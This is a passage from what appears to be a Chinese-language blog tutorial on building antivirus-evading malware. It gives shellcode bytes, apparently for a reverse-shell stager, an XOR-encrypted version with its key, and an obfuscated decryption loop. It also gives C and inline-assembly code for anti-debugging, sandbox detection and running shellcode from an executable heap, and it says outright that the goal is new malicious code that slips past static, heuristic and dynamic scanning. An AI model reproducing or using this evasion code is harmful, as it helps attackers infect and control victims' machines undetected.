class="number">0x40</span>,</span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x97</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x56</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0c</span>,</span><br><span class="line">  <span class="number">0xff</span>, <span class="number">0x4e</span>, <span class="number">0x08</span>, <span class="number">0x75</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>,</span><br><span class="line">  <span class="number">0xd5</span>, <span class="number">0x8b</span>, <span class="number">0x36</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x93</span>, <span class="number">0x53</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>,</span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x75</span>, <span class="number">0xee</span>, <span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">为了使熵值和文件大小保持在适当的值，我们将会使用简单的XOR加密算法加密这段shellcode，虽然XOR不是一个像RC4、blowfis的标准的加密算法，但是我们不需要一个强加密算法，因为反病毒软件不会去解密shellcode，仅仅是让这段shellcode对静态字符串分析不可读和不可检测就够了，同时使用XOR会使得解密更快并且避免使用加密库会使文件大小更小。</span><br><span class="line">经过XOR加密后的代码如下：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfb</span>, <span class="number">0xcd</span>, <span class="number">0x8d</span>, <span class="number">0x9e</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x93</span>, <span class="number">0xe2</span>, <span class="number">0x14</span>, <span class="number">0xcf</span>, <span class="number">0xfa</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x12</span>, <span class="number">0xb1</span>, <span class="number">0x91</span>, <span class="number">0x55</span>, <span class="number">0x29</span>, <span class="number">0x84</span>, <span class="number">0xcc</span>, <span class="number">0xae</span>, <span class="number">0xc9</span>, <span class="number">0xf3</span>, <span class="number">0x32</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x92</span>, <span class="number">0x45</span>, <span class="number">0xb8</span>, <span class="number">0x8b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x66</span>, <span class="number">0x59</span>, <span class="number">0x0d</span>, <span class="number">0xb2</span>,</span><br><span class="line">  <span class="number">0x9a</span>, <span class="number">0x83</span>, <span class="number">0x4e</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x6c</span>, <span class="number">0xe8</span>, <span class="number">0x15</span>, <span class="number">0x0a</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0xae</span>, <span class="number">0x45</span>, <span class="number">0xa2</span>, <span class="number">0x31</span>, <span class="number">0x0e</span>, <span class="number">0x90</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0x6d</span>, <span class="number">0x0e</span>, <span class="number">0x4f</span>,</span><br><span class="line">  <span class="number">0xeb</span>, <span class="number">0xc9</span>, <span class="number">0xd8</span>, <span class="number">0x3a</span>, <span class="number">0x06</span>, <span class="number">0xf6</span>, <span class="number">0x84</span>, <span class="number">0xd7</span>, <span class="number">0xa2</span>, <span class="number">0xa1</span>, <span class="number">0xbb</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0x8c</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, <span class="number">0x9f</span>, <span class="number">0x6c</span>, <span class="number">0x73</span>, <span class="number">0x7e</span>, <span class="number">0xb6</span>, <span class="number">0xc6</span>, <span class="number">0xea</span>, <span class="number">0x02</span>, <span class="number">0x9f</span>,</span><br><span class="line">  <span class="number">0x7d</span>, <span class="number">0x7a</span>, <span class="number">0x61</span>, <span class="number">0x6f</span>, <span class="number">0xf1</span>, <span class="number">0x26</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x3f</span>, <span class="number">0xa5</span>, <span class="number">0x6f</span>,</span><br><span class="line">  <span class="number">0xe3</span>, <span class="number">0x7d</span>, <span class="number">0x84</span>, <span class="number">0xc6</span>, <span class="number">0x9e</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x7c</span>, <span class="number">0x8c</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0xe2</span>, <span class="number">0x5e</span>, <span class="number">0x80</span>, <span class="number">0xc9</span>, <span class="number">0x8c</span>, <span class="number">0x21</span>, <span class="number">0x84</span>, <span class="number">0x9f</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xc5</span>, <span class="number">0x3e</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x7e</span>, <span class="number">0x54</span>, <span class="number">0xff</span>, <span class="number">0xe3</span>, <span class="number">0x18</span>, <span class="number">0xd0</span>, <span class="number">0xe5</span>, <span class="number">0xe7</span>, <span class="number">0x7a</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x50</span>, <span class="number">0x6a</span>, <span class="number">0x97</span>, <span class="number">0x5a</span>, <span class="number">0x4d</span>, <span class="number">0x3c</span>, <span class="number">0xac</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x17</span>, <span class="number">0x50</span>, <span class="number">0xca</span>, <span class="number">0xd2</span>, <span class="number">0x0e</span>, <span class="number">0xf6</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0x2a</span>, <span class="number">0x43</span>, <span class="number">0x81</span>, <span class="number">0x1a</span>, <span class="number">0x2e</span>, <span class="number">0xe1</span>, <span class="number">0x5b</span>, <span class="number">0xce</span>, <span class="number">0xd2</span>, <span class="number">0x6b</span>, <span class="number">0x01</span>, <span class="number">0x71</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0xf4</span>, <span class="number">0xbf</span>, <span class="number">0x2a</span>, <span class="number">0xfe</span>, <span class="number">0x1a</span>, <span class="number">0x07</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x53</span>, <span class="number">0xdd</span>, <span class="number">0x93</span>, <span class="number">0xe1</span>, <span class="number">0x75</span>, <span class="number">0x5f</span>, <span class="number">0xce</span>, <span class="number">0xea</span>, <span class="number">0x02</span>, <span class="number">0xd1</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x4d</span>, <span class="number">0xe5</span>, <span class="number">0x91</span>, <span class="number">0x65</span>, <span class="number">0xa2</span>, <span class="number">0x7e</span>, <span class="number">0xcf</span>, <span class="number">0x90</span>, <span class="number">0x4f</span>, <span class="number">0x1f</span>, <span class="number">0xc8</span>,</span><br><span class="line">  <span class="number">0xed</span>, <span class="number">0x2a</span>, <span class="number">0x18</span>, <span class="number">0xbf</span>, <span class="number">0x73</span>, <span class="number">0x44</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>, <span class="number">0x3f</span>, <span class="number">0x82</span>, <span class="number">0xf5</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0xf8</span>, <span class="number">0x6b</span>, <span class="number">0x07</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0x2a</span>, <span class="number">0x71</span>, <span class="number">0xaf</span>, <span class="number">0xa5</span>, <span class="number">0x73</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x42</span>, <span class="number">0xeb</span>, <span class="number">0x1e</span>, <span class="number">0x51</span>, <span class="number">0x72</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>, <span class="number">0x63</span>, <span class="number">0x8a</span>, <span class="number">0xde</span>, <span class="number">0xe5</span>,</span><br><span class="line">  <span class="number">0xd2</span>, <span class="number">0xae</span>, <span class="number">0x39</span>, <span class="number">0xf4</span>, <span class="number">0xfa</span>, <span class="number">0x2a</span>, <span class="number">0x81</span>, <span class="number">0x0a</span>, <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0xbe</span>, <span class="number">0x54</span>, <span class="number">0xc0</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>, <span class="number">0x29</span>, <span class="number">0x11</span>, <span class="number">0xeb</span>, <span class="number">0x1a</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf6</span>, <span class="number">0xb8</span>, <span class="number">0x9b</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0xf8</span>, <span class="number">0xf0</span>, <span class="number">0x0e</span>, <span class="number">0x5d</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x84</span>, <span class="number">0xf4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[] = &#123;</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x0f</span>, <span class="number">0x9e</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0x81</span>, <span class="number">0x1a</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><br>由于我们编写了一个新的恶意代码，因反病毒防病毒软件不知道我们的恶意代码的哈希签名，因此我们不必担心基于特征码的检测，我们将对shellcode进行加密并混淆我们的反检测、反逆向工程、解密功能的代码，这样就足够绕过基于静态和启发式扫描，最后就只需要绕过反病毒软件的动态扫描就可以了，绕过动态扫描最重要的方法是通过AV detect实现，但是在开始写AV detect功能之前我们将介绍反病毒软件的启发式分析引擎是如何工作的。<br><br>## 启发式引擎<br><br>启发式引擎是基于统计和规则的分析机制。它们的主要目的是通过根据预定义的标准对代码片段进行分类并为代码片段提供威胁/风险等级，从而检测新一代（以前未知的）恶意代码，反病毒软件即使在扫描的简单hello world程序的情况下，启发式引擎也会确定威胁/风险评分，分数一旦高于阈值，该文件就会被标记为恶意。启发式引擎是反病毒软件中最高级的部分，它们使用大量规则和标准，因为没有反病毒公司发布有关其启发式引擎的设计文件或文档，所有关于其威胁/风险分级策略的已知选择性标准都是通过反复试验而发现的。<br>一些有关威胁等级的已知规则：<br>– 检测到解密循环<br>– 读取当前的计算机名称<br>– 读取密码机GUID<br>– 连接随机域名<br>– 读取Windows安装日期<br>– 删除可执行文件<br>– 在二进制文件中发现潜在的IP地址<br>– 修改代理设置<br>– 对正在运行的过程安装hook/patch程序<br>– 注入资源管理器explorer<br>– 注入远程进程<br>– 查询进程信息<br>– 设置进程错误模式避免弹出错误弹窗<br>– 不正常的熵值<br>– 检查潜在的反病毒软件<br>– 监视特定的注册表项以进行更改<br>– 包含提升特权的能力<br>– 修改软件策略设置<br>– 读取系统/视频BIOS版本<br>– PE标头中存在不常见的section<br>– 创建受保护的内存区域<br>– 创建很多进程<br>– 尝试长时间休眠<br>– 不常见的sections<br>– 读取Windows产品ID<br>– 包含解密循环<br>– 包含启动/交互设备驱动程序的功能<br>– 包含阻止用户输入的功能<br>…<br><br>在编写我们的AV检测和解密Shellcode函数时，我们必须注意以下所有规则。<br><br>### 解密Shellcode<br><br>混淆解密函数至关重要，大多数反病毒软件启发式引擎都能够检测PE文件内部的解密循环，在勒索软件攻击案例大量增加之后，甚至构建了一些启发式引擎专门用于检测加密/解密函数，一旦检测到解密函数，某些扫描器会等到ECX寄存器为0时，预示解密循环结束，扫描器会去分析被解密的文件内容<br>下面就是Decrypt Shellcode函数：<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DecryptShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(Shellcode); i++) &#123;</span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ True1</span><br><span class="line">      __asm __emit(<span class="number">0xca</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x55</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x78</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x2c</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x02</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x9b</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x6e</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xe9</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x3d</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x6f</span>)</span><br><span class="line"></span><br><span class="line">      True1:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    Shellcode[i] = (Shellcode[i] ^ Key[(i % <span class="keyword">sizeof</span>(Key))]);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ True2</span><br><span class="line">      __asm __emit(<span class="number">0xd5</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xb6</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x43</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x87</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xde</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x37</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x24</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xb0</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x3d</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xee</span>)</span><br><span class="line">      True2:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>这是一个for循环，它使shellcode字节和key字节之间进行逻辑异或运算，而前后两部分汇编代码（有_asm开始的）是无意义的，使用随机字节覆盖逻辑异或运算但是执行时会跳过这部分代码。由于我们没有使用任何高级解密机制，因此足以混淆Decrypt Shellcode功能。<br><br>### 动态分析检测<br><br>同样，在编写沙箱检测函数时，需要对其进行混淆，如果启发式引擎检测到任何反逆向工程方法的信息，则对恶意软件的威胁评分将非常不利。<br><br>### 当前是否在被调试<br><br>我们的第一个反病毒检测机制将在我们的进程中检查调试器，需要使用一个Windows API函数，功能为确定调用过程是否正在由用户模式调试器调试。但是我们不会使用它，因为大多数反病毒软件都在监视win API调用，因此它们可能会将此功能检测为反逆向工程方法。我们使用PEB块中的BeingDebuged标志位而不是使用API。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// bool WINAPI IsDebuggerPresent(void);</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">CheckDebugger:</span><br><span class="line">  PUSH EAX                    <span class="comment">// Save the EAX value to stack</span></span><br><span class="line">  MOV EAX, [FS:<span class="number">0x30</span>]          <span class="comment">// Get PEB structure address</span></span><br><span class="line">  MOV EAX, [EAX+<span class="number">0x02</span>]         <span class="comment">// Get being debugged byte</span></span><br><span class="line">  TEST EAX, EAX               <span class="comment">// Check if being debuged byte is set</span></span><br><span class="line">  JNE CheckDebugger           <span class="comment">// If debugger present check again</span></span><br><span class="line">  POP EAX                     <span class="comment">// Put back the EAX value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>通过使用内联汇编，这段代码使用指向PEB块中的BeingDebuged标志位的指针，如果存在调试器，它将再次检查直到堆栈中发生溢出，当发生溢出时，堆栈会触发异常并关闭进程，这是退出程序的最简单的方法。检查是否正在被调试的将绕过一定数量的反病毒产品，但是仍有一些反病毒软件已针对此问题采取了措施，因此我们需要对代码进行混淆处理以避免静态特征码分析。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__asm</span><br><span class="line">  &#123;</span><br><span class="line">  CheckDebugger:</span><br><span class="line">    PUSH EAX</span><br><span class="line">    MOV EAX, DWORD PTR FS : [<span class="number">0x18</span>]</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    MOV EAX, DWORD PTR[EAX + <span class="number">0x30</span>]</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J2</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J2:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    CMP BYTE PTR[EAX + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J3</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J3:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    JNE CheckDebugger</span><br><span class="line">    POP EAX</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>我在所有操作之后都添加了跳转指令，这不会修改原始代码的作用，但是在跳转之间添加垃圾字节会混淆代码并避免被静态分析检测。<br><br>### 加载虚假的DLL<br><br>我们将尝试在运行时加载不存在的dll。通常，当我们尝试加载不存在的dll时，HISTENCE返回NULL，但是某些反病毒软件动态分析时会正常返回，以便进一步检查程序的执行流程,这样就可以检测到在沙盒中执行。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">BypassAV</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> * argv[])</span> </span>&#123;</span><br><span class="line">  HINSTANCE DLL = LoadLibrary(TEXT(<span class="string">"fake.dll"</span>));</span><br><span class="line">  <span class="keyword">if</span> (DLL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    BypassAV(argv);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>### 运行时间<br><br>在这种方法中，我们将利用反病毒软件处理时间的漏洞。在大多数情况下，反病毒软件扫描器是为终端用户设计的，它们必须对用户友好并且适合日常使用，这意味着它们不会花费太多时间来扫描文件，而需要尽快扫描文件。最初，恶意软件开发人员使用sleep()函数等待扫描完成，但是如今，这种技巧几乎不再起作用，每个防病毒产品在遇到一个时都会跳过睡眠功能。我们将针对它们使用此代码，下面的代码使用了一个称为GetThickCount()的Windows API函数，该函数返回检索自系统启动以来经过的毫秒数，最长为49.7天。我们将使用它来获取自操作系统启动以来经过的时间，然后尝试睡眠1秒钟，在睡眠函数之后，我们将通过比较两个GetTickCout()值来检查运行环境Sleep函数是否被跳过。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Tick = GetTickCount();</span><br><span class="line">  Sleep(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">int</span> Tac = GetTickCount();</span><br><span class="line">  <span class="keyword">if</span> ((Tac - Tick) &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>### 处理器核心数<br><br>此方法只用查询系统上处理器核心的数量。由于反病毒软件无法从主机分配过多资源，因此我们可以检查处理器核心数，以确定我们是否在沙箱中。同时某些反病毒软件沙盒也不支持多处理器因此在其沙盒中也仅仅会保留一个处理器。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM_INFO SysGuide;</span><br><span class="line">GetSystemInfo(&amp;SysGuide);</span><br><span class="line"><span class="keyword">int</span> CoreNum = SysGuide.dwNumberOfProcessors;</span><br><span class="line"><span class="keyword">if</span> (CoreNum &lt; <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 大内存分配<br><br>该方法也是利用了反病毒软件每次扫描的时间短的漏洞，我们只需分配近100 Mb的内存，然后将其填充为NULL字节，最后释放它。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * Memdmp = <span class="literal">NULL</span>;</span><br><span class="line">Memdmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100000000</span>);</span><br><span class="line"><span class="keyword">if</span> (Memdmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">memset</span>(Memdmp, <span class="number">00</span>, <span class="number">100000000</span>);</span><br><span class="line">  <span class="built_in">free</span>(Memdmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>当程序内存在运行时开始增长时，最终反病毒软件扫描器将结束扫描，以免在文件上花费过多时间，该方法可以多次使用。这是一种非常原始和古老的技术，但它仍然绕过了大量的扫描器。<br><br>### trap标志位设置<br><br>trap标志用于单步调试跟踪程序。如果设置了此标志，则每条指令都会引发SINGLE_STEP异常。可以对陷阱标志进行操作，以阻止跟踪程序。我们可以使用以下代码操作陷阱标志。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  PUSHF 			<span class="comment">// Push all flags to stack</span></span><br><span class="line">  MOV DWORD [ESP], <span class="number">0x100</span>	<span class="comment">// Set 0x100 to the last flag on the stack</span></span><br><span class="line">  POPF 				<span class="comment">// Put back all flags register values		</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 通过互斥量触发WinExec<br><br>该方法由于其简单性而非常有前途，我们创建了一个条件来检查系统上是否已经存在某个互斥对象。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE AmberMutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">"FakeMutex"</span>);</span><br><span class="line"><span class="keyword">if</span>(GetLastError() != ERROR_ALREADY_EXISTS)&#123;</span><br><span class="line">  WinExec(argv[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>如果CreateMutex功能未返回错误，我们将再次执行该恶意软件二进制文件，因为大多数反病毒产品都不会让程序在进行动态分析时启动新进程或访问外部的文件发生，如果返回mutex已经存在错误则可以开始执行解密功能。在反检测中，互斥量使用的想法更多。<br><br>### 正确执行Shellcode的方法<br><br>从Windows Vista开始，Microsoft引入了数据执行保护或DEP，这是一项安全功能，可以通过实时监视程序来帮助防止损坏计算机。监视可确保正在运行的程序有效地使用系统内存。如果您的计算机上存在某个程序实例错误地使用了内存，则DEP会注意到它，然后关闭该程序并通知您。这意味着您不能只将一些字节放入char数组中并执行它，而是需要使用Windows API函数使用read，write和execute标志分配一个内存区域。<br>Microsoft有几个用于保留内存页面的内存操作API函数，该领域中的大多数常见恶意软件都使用VirtualAlloc功能来保留内存页面，因为您可以猜测这些函数的常见用法有助于反病毒产品使用其他内存来定义检测规则操纵功能，并且可能会引起较少的注意。<br>我将列出几种具有不同内存操作API函数的shellcode执行方法：<br><br><strong>HeapCreate/HeapAlloc</strong>：<br><br>Windows还允许创建RWE堆区域<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="keyword">sizeof</span>(Shellcode), <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  <span class="keyword">char</span> * BUFFER = (<span class="keyword">char</span>*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span 